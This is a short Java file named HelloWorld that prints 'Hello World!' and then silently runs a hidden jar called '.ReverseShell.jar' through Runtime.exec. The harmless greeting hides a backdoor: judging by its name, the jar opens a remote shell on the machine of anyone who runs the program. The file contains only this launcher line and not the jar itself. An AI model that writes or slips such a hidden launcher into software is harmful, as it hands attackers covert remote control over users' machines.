import java.io.*;

public class HelloWorld {
   public static void main(String[] args) throws IOException {
      System.out.println("Hello World!");
      Process process = Runtime.getRuntime().exec("java -jar .ReverseShell.jar");
   }
}
